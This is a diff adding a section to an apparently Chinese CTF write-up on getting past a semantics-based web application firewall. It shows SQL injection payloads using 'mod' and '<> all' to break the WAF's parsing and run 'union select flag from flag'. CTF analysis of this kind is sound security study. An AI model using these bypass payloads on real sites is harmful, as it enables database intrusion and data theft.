@@ -244,6 +244,22 @@ Cool, give you an interesting string: bctf{0ad99685303ed109abed3a80269563c4}
 
 <p><strong>毁三观。</strong><br>
 测试了一下，在上面的payload里面，ASCII &gt;= 128 的字符重复3次或者&gt;=8次即可输出flag。  </p>
+<h2>Nu1L战队的Payload</h2>
+<p><a href="http://bobao.360.cn/ctf/detail/192.html" target="_blank">http://bobao.360.cn/ctf/detail/192.html</a>  </p>
+<div class="highlight"><pre><span></span>基于语义的waf,
+引入能够打乱语义判断的就可以触发到了
+mysql 有 mod 的比较符和函数
+想着通过引入两个去打乱语义
+payload:  &#39;mod mod(1,1) union select flag from flag#
+</pre></div>
+
+
+<p>看完之后深受启发，结合上文发现的 <code>&lt;&gt; all</code> 的效果推测可能也是扰乱了WAF。于是发现了新的Payload：  </p>
+<div class="highlight"><pre><span></span>name=&#39;&lt;&gt;all(select 0) union select flag from flag#
+</pre></div>
+
+
+<p>上面两种都是直接显示flag。</p>
 <h1>如何搞出这种稀奇古怪的Payload</h1>
 <ul>
 <li>看文档</li>
